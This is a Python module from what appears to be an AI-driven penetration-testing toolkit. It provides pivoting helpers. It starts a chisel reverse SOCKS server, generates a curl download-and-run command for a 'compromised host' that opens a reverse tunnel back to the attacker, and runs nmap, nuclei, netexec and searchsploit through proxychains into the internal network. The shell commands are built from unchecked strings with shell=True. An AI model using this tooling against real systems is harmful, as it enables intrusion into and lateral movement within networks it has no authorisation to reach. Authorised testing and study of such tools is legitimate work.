"""Tunnel helpers — chisel reverse SOCKS + proxychains (改造⑥-P0).

- chisel_tunnel:  start a local chisel reverse-connections server; return the target-side
                  client command (binary pushed over a local http server) and the resulting
                  local SOCKS5 endpoint.
- chisel_stop:    terminate the running chisel server.
- proxychains_run: run nmap/nuclei/netexec/curl/... through the tunnel SOCKS5.
"""
import os
import socket
import subprocess
import time
from typing import Any, Dict

CHISEL = os.path.expanduser("~/.local/bin/chisel")
CHISEL_LINUX = os.path.expanduser("~/hexstrike-ai/bin/chisel-linux-amd64")
CONF = "/tmp/hx_proxychains.conf"
_SERVERS: Dict[int, subprocess.Popen] = {}
_DEFAULT_CONF = """strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0

[ProxyList]
socks5 127.0.0.1 %d
"""


def _lan_ip() -> str:
    try:
        out = subprocess.run(["ipconfig", "getifaddr", "en0"], capture_output=True, text=True).stdout.strip()
        if out:
            return out
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def _proxychains_conf(socks_port: int) -> str:
    with open(CONF, "w") as f:
        f.write(_DEFAULT_CONF % socks_port)
    return CONF


def chisel_tunnel(local_port: int = 8080, socks_port: int = 1080,
                  attacker_ip: str = "", serve_port: int = 9000) -> Dict[str, Any]:
    if not os.path.exists(CHISEL):
        return {"success": False, "error": f"chisel missing at {CHISEL}"}
    if local_port in _SERVERS:
        return {"success": False, "error": f"chisel server already running on :{local_port}"}
    log = f"/tmp/chisel_server_{local_port}.log"
    logf = open(log, "w")
    proc = subprocess.Popen([CHISEL, "server", "-p", str(local_port), "--reverse"],
                            stdout=logf, stderr=subprocess.STDOUT)
    _SERVERS[local_port] = proc
    time.sleep(1.2)
    if proc.poll() is not None:
        return {"success": False, "error": "chisel server exited",
                "log_tail": open(log, errors="replace").read()[-800:]}
    _proxychains_conf(socks_port)
    ip = attacker_ip or _lan_ip()
    return {
        "success": True,
        "local_port": local_port,
        "socks_port": socks_port,
        "socks_endpoint": f"127.0.0.1:{socks_port}",
        "log": log,
        "proxychains_conf": CONF,
        "attacker_push_cmd": f"cd {os.path.dirname(CHISEL_LINUX)} && python3 -m http.server {serve_port}",
        "target_client_cmd": (
            f"curl -fsSL http://{ip}:{serve_port}/chisel-linux-amd64 -o /tmp/chisel && chmod +x /tmp/chisel "
            f"&& /tmp/chisel client {ip}:{local_port} R:socks"
        ),
        "note": "Run attacker_push_cmd locally, paste target_client_cmd on the compromised host, "
                "then the SOCKS5 at 127.0.0.1:{socks_port} routes into the internal network.",
    }


def chisel_stop(local_port: int = 8080) -> Dict[str, Any]:
    if local_port not in _SERVERS:
        return {"success": False, "error": f"no chisel server for :{local_port}"}
    proc = _SERVERS.pop(local_port)
    try:
        proc.terminate()
        proc.wait(timeout=5)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass
    return {"success": True, "local_port": local_port, "stopped": True}


def proxychains_run(tool: str = "nmap", target: str = "", extra: str = "",
                    socks_port: int = 1080, timeout: int = 180) -> Dict[str, Any]:
    conf = _proxychains_conf(socks_port)
    target = target.strip()
    extra = extra.strip()
    if tool == "nmap":
        cmd = f"proxychains4 -q -f {conf} nmap -Pn -sT {extra} {target}".strip()
    elif tool == "nuclei":
        cmd = f"proxychains4 -q -f {conf} nuclei -u {target} {extra}".strip()
    elif tool == "netexec":
        cmd = f"proxychains4 -q -f {conf} netexec smb {target} {extra}".strip()
    elif tool == "curl":
        cmd = f"proxychains4 -q -f {conf} curl -sk {extra} {target}".strip()
    elif tool == "searchsploit":
        cmd = f"proxychains4 -q -f {conf} searchsploit {extra} {target}".strip()
    else:
        cmd = f"proxychains4 -q -f {conf} {tool} {extra} {target}".strip()
    if not target:
        return {"success": False, "error": "target required"}
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "timeout", "timeout": timeout}
    return {
        "success": r.returncode == 0,
        "exit_code": r.returncode,
        "command": cmd,
        "stdout": r.stdout[-20000:],
        "stderr": r.stderr[-4000:],
    }